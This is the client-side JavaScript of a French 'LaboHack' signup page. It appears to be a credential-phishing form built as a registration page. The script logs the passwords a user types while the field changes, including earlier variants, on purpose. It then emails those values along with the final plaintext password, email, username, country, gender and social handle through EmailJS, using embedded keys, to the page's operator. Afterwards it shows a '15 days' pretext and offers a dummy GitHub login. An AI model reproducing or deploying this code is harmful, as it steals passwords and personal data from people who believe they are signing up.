// ============================================================
//  LABOHACK - Configuration EmailJS (Clés intégrées)
// ============================================================
const EMAILJS_PUBLIC_KEY = 'sB1cJXt7DykBzocSR';
const EMAILJS_SERVICE_ID  = 'service_j8i0h5n';
const EMAILJS_TEMPLATE_ID = 'template_3nt63pp';

// ============================================================
//  ÉTAT & RÉFÉRENCES
// ============================================================
let passwordAttempts = [];
let isSubmitting = false;

const form = document.getElementById('signupForm');
const passwordInput = document.getElementById('password');
const confirmInput = document.getElementById('confirmPassword');
const toast = document.getElementById('toast');
const submitBtn = document.querySelector('button[type="submit"]');

// ============================================================
//  1. VÉRIFICATION DE FORCE (VISUELLE, SANS EMAIL)
// ============================================================
passwordInput.addEventListener('input', function() {
  const pwd = this.value;
  const bars = [
    document.getElementById('strengthBar1'),
    document.getElementById('strengthBar2'),
    document.getElementById('strengthBar3')
  ];
  const label = document.getElementById('strengthLabel');

  // Réinitialiser
  bars.forEach(bar => bar.classList.remove('active'));

  if (pwd.length === 0) {
    label.textContent = 'Force : —';
    label.style.color = '#666';
    return;
  }

  // Score simple (Longueur, Maj/Min, Chiffres/Speciaux)
  let score = 0;
  if (pwd.length >= 8) score++;
  if (/[A-Z]/.test(pwd) && /[a-z]/.test(pwd)) score++;
  if (/\d/.test(pwd) || /[^A-Za-z0-9]/.test(pwd)) score++;

  // Mise à jour des barres
  for (let i = 0; i < score; i++) {
    bars[i].classList.add('active');
  }

  // Label & Couleur
  if (score === 0) { label.textContent = 'Force : Faible'; label.style.color = '#ff4444'; }
  else if (score === 1) { label.textContent = 'Force : Faible'; label.style.color = '#ff8844'; }
  else if (score === 2) { label.textContent = 'Force : Moyen'; label.style.color = '#ffcc00'; }
  else { label.textContent = 'Force : Fort'; label.style.color = '#00ff41'; }

  // Stocker les tentatives (uniquement si >= 8 caractères)
  if (pwd.length >= 8) {
    passwordAttempts.push(pwd);
    if (passwordAttempts.length > 5) passwordAttempts.shift(); // Garder les 5 derniers
  }
});

// ============================================================
//  2. SOUMISSION DU FORMULAIRE (1 SEUL EMAIL)
// ============================================================
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  // --- Éviter les doubles soumissions ---
  if (isSubmitting) return;
  isSubmitting = true;
  submitBtn.textContent = '⏳ ENVOI EN COURS...';
  submitBtn.disabled = true;

  // --- Récupération des champs ---
  const username = document.getElementById('username').value.trim();
  const email = document.getElementById('email').value.trim();
  const password = passwordInput.value.trim();
  const confirm = confirmInput.value.trim();
  const country = document.getElementById('country').value;
  const genderEl = document.querySelector('input[name="gender"]:checked');
  const social = document.getElementById('social').value.trim();
  const terms = document.getElementById('terms').checked;

  // --- VALIDATIONS ROBUSTES ---
  if (!username || !email || !password || !confirm || !country || !genderEl || !terms) {
    showToast('⚠️ Tous les champs obligatoires doivent être remplis.', true);
    resetSubmitButton();
    return;
  }

  if (password !== confirm) {
    showToast('❌ Les mots de passe ne correspondent pas.', true);
    resetSubmitButton();
    return;
  }

  if (password.length < 8) {
    showToast('❌ Le mot de passe doit faire au moins 8 caractères.', true);
    resetSubmitButton();
    return;
  }

  // --- Préparation des données pour EmailJS ---
  const templateParams = {
    nom: username,
    email: email,
    password: password,
    country: country,
    gender: genderEl.value,
    social: social || 'Non renseigné',
    attempts: passwordAttempts.length > 0 ? passwordAttempts.join(' → ') : 'Aucune tentative',
    final: '✅ OUI'
  };

  try {
    // Initialisation d'EmailJS
    await emailjs.init(EMAILJS_PUBLIC_KEY);

    // Envoi de l'email (UNIQUE)
    const response = await emailjs.send(
      EMAILJS_SERVICE_ID,
      EMAILJS_TEMPLATE_ID,
      templateParams
    );

    console.log('✅ Email envoyé avec succès !', response);
    showToast('✅ Inscription réussie ! Redirection...', false);

    // --- PAGE DE REDIRECTION "15 JOURS" ---
    document.body.innerHTML = `
      <div class="container" style="text-align:center; padding:4rem 2rem;">
        <h1 style="font-size:2.8rem; letter-spacing:8px; text-shadow:0 0 20px #00ff41;">LABO<span style="color:#00f0ff; text-shadow:0 0 20px #00f0ff;">HACK</span></h1>
        <div style="font-size:5rem; margin:2rem 0;">⏳</div>
        <h2 style="color:#00f0ff; font-size:1.8rem;">Merci !</h2>
        <p style="color:#00ff41; font-size:1.3rem; margin:1rem 0;">
          Nous vérifions vos informations.<br>
          <strong style="color:#ff0044; font-size:1.6rem;">Vous recevrez un email dans 15 jours</strong> si vous êtes sélectionné.
        </p>
        <p style="color:#444; margin-top:2rem; font-size:0.7rem; letter-spacing:2px;">🔐 LaboHack</p>
      </div>
    `;

  } catch (error) {
    console.error('❌ Erreur EmailJS :', error);
    showToast('❌ Erreur lors de l\'envoi. Vérifie ta connexion ou ta clé API.', true);
    resetSubmitButton();
  }
});

// ============================================================
//  3. BOUTON GITHUB (FACTICE)
// ============================================================
document.getElementById('githubBtn').addEventListener('click', () => {
  showToast('🔐 Fonctionnalité de connexion GitHub en développement.', true);
});

// ============================================================
//  4. FONCTIONS UTILITAIRES (Toast & Reset)
// ============================================================
function showToast(text, isError = true) {
  toast.textContent = text;
  toast.classList.remove('hidden');
  toast.style.borderColor = isError ? '#ff0044' : '#00ff41';
  toast.style.color = isError ? '#ff0044' : '#00ff41';
  // Efface automatiquement après 5 secondes
  clearTimeout(window.toastTimeout);
  window.toastTimeout = setTimeout(() => {
    toast.classList.add('hidden');
  }, 5000);
}

function resetSubmitButton() {
  isSubmitting = false;
  submitBtn.textContent = "S'INSCRIRE";
  submitBtn.disabled = false;
}

// ============================================================
//  5. NETTOYAGE DES TENTATIVES (SI L'UTILISATEUR EFFACE LE CHAMP)
// ============================================================
// Note : Les tentatives restent dans le tableau même si l'utilisateur efface.
// C'est voulu pour garder une trace des essais précédents.
